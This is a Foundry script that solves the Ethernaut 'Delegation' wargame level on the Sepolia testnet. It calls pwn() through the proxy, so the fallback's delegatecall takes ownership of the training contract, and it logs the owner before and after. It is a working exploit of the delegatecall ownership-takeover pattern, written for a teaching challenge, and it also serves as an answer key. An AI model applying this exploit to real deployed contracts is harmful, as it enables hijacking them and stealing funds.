// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IDelegate {
    function owner() external returns (address);
    function pwn() external;
}

contract DelegationSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x73379d8B82Fda494ee59555f333DF7D44483fD58;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    // forge script script/solutions/06-Delegation.s.sol:DelegationSolution --rpc-url $SEPOLIA_RPC
    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        // Delegation is the proxy contract, and Delegate is the implementation contract
        // so we use implementation contract's interface to interact with the proxy contract
        IDelegate delegation = IDelegate(challengeInstance);
        address ownerBefore = delegation.owner();
        delegation.pwn();
        // since delegation did not have a pwn function
        // it actually do address(delegate).delegatecall(abi.encodeWithSignature("pwn()"));
        address ownerAfter = delegation.owner();
        console2.log("Owner before: ", ownerBefore);
        console2.log("Owner after: ", ownerAfter);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(6));
    }
}
